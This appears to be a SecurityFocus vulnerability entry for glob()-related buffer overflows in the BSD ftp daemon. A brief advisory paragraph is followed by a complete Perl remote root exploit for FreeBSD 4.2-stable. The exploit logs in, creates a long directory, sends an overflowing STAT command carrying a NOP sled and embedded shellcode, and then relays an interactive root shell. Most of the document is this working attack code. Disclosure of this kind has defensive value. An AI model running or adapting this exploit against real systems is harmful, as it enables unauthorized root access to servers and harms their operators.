source: http://www.securityfocus.com/bid/2548/info
 
 
The BSD ftp daemon and derivatives (such as IRIX ftpd or the ftp daemon shipped with Kerberos 5) contain a number of buffer overflows that may lead to a compromise of root access to malicious users.
 
During parsing operations, the ftp daemon assumes that there can never be more than 512 bytes of user-supplied data. This is because that is usually how much data is read from a socket. Because of this assumption, certain memory copy operations involving user data lack bounds checking.
 
It is possible for users to use metacharacters to expand file/path names through interpretation by glob() and exploit these overflowable conditions. In order to do so, the attacker's ftp account must be able to either create directories or directories with long enough names must exist already.
 
Any attacker to successfully exploit this vulnerability would gain root access on the target host. 

#!/usr/bin/perl

###############################################################################
# glob() ftpd remote root exploit for freebsd 4.2-stable                      #
#                                                                             #
# babcia padlina ltd. / venglin@freebsd.lublin.pl                             #
#                                                                             #
# this version requires user access and writeable homedir without chroot.     #
###############################################################################

require 5.002;
use strict;
use sigtrap;
use Socket;

my($recvbuf, $host, $user, $pass, $iaddr, $paddr, $proto, $code, $ret, $off, $align, $rin, $rout, $read);

# teso shellcode ripped from 7350obsd

$code  = "\x31\xc0\x99\x52\x52\xb0\x17\xcd\x80\x68\xcc\x73\x68\xcc\x68";
$code .= "\xcc\x62\x69\x6e\xb3\x2e\xfe\xc3\x88\x1c\x24\x88\x5c\x24\x04";
$code .= "\x88\x54\x24\x07\x89\xe6\x8d\x5e\x0c\xc6\x03\x2e\x88\x53\x01";
$code .= "\x52\x53\x52\xb0\x05\xcd\x80\x89\xc1\x8d\x5e\x05\x6a\xed\x53";
$code .= "\x52\xb0\x88\xcd\x80\x53\x52\xb0\x3d\xcd\x80\x51\x52\xb0\x0c";
$code .= "\x40\xcd\x80\xbb\xcc\xcc\xcc\xcc\x81\xeb\x9e\x9e\x9d\xcc\x31";
$code .= "\xc9\xb1\x10\x56\x01\xce\x89\x1e\x83\xc6\x03\xe0\xf9\x5e\x8d";
$code .= "\x5e\x10\x53\x52\xb0\x3d\xcd\x80\x89\x76\x0c\x89\x56\x10\x8d";
$code .= "\x4e\x0c\x52\x51\x56\x52\xb0\x3b\xcd\x80\xc9\xc3\x55\x89\xe5";
$code .= "\x83\xec\x08\xeb\x12\xa1\x3c\x50\x90";

#$ret = 0xbfbfeae8; - stos lagoona
#$ret = 0x805baf8; - bss info
$ret = 0x805e23a; # - bss lagoon

if (@ARGV < 3)
{
	print "Usage: $0 <hostname> <username> <password> [align] [offset]\n";
	exit;
}

($host, $user, $pass, $align, $off) = @ARGV;

if (defined($off))
{
	$ret += $off;
}

if (!defined($align))
{
	$align = 1;
}

print "Globulka v1.0 by venglin\@freebsd.lublin.pl\n\n";
print "RET: 0x" . sprintf('%lx', $ret) . "\n";
print "Align: $align\n\n";

$iaddr = inet_aton($host)			or die "Unknown host: $host\n";
$paddr = sockaddr_in(21, $iaddr)		or die "getprotobyname: $!\n";
$proto = getprotobyname('tcp')			or die "getprotobyname: $!\n";

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)	or die "socket: $!\n";
connect(SOCKET, $paddr)				or die "connect: $!\n";

do
{
	$recvbuf = <SOCKET>;
}
while($recvbuf =~ /^220- /);

print $recvbuf;

if ($recvbuf !~ /^220 .+/)
{
	die "Exploit failed.\n";
}

send(SOCKET, "USER $user\r\n", 0)		or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^(331|230) .+/)
{
	print $recvbuf;
	die "Exploit failed.\n";
}

send(SOCKET, "PASS $pass\r\n", 0)		or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^230 .+/)
{
	print $recvbuf;
	die "Exploit failed.\n";
}
else
{
	print "Logged in as $user/$pass. Sending evil STAT command.\n\n";
}

send(SOCKET, "MKD " . "A"x255 . "\r\n", 0)		or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^(257|550) .+/)
{
	print $recvbuf;
	die "Exploit failed.\n";
}

send(SOCKET, "STAT A*/../A*/../A*/" . "\x90" x (90+$align) . $code .
	pack('l', $ret) x 30 . "\r\n", 0)		or die "send: $!\n";

sleep 1;

send(SOCKET, "id\n", 0) 			or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^uid=.+/)
{
	die "Exploit failed.\n";
}
else
{
	print $recvbuf;
}

vec($rin, fileno(STDIN), 1) = 1;
vec($rin, fileno(SOCKET), 1) = 1;

for(;;)
{
	$read = select($rout=$rin, undef, undef, undef);
	if (vec($rout, fileno(STDIN), 1) == 1)
	{
		if (sysread(STDIN, $recvbuf, 1024) == 0)
		{
			exit;
		}
		send(SOCKET, $recvbuf, 0);
	}

	if (vec($rout, fileno(SOCKET), 1) == 1)
	{
		if (sysread(SOCKET, $recvbuf, 1024) == 0)
		{
			exit;
		}
		syswrite(STDIN, $recvbuf, 1024);
	}
}

close SOCKET;

exit;

--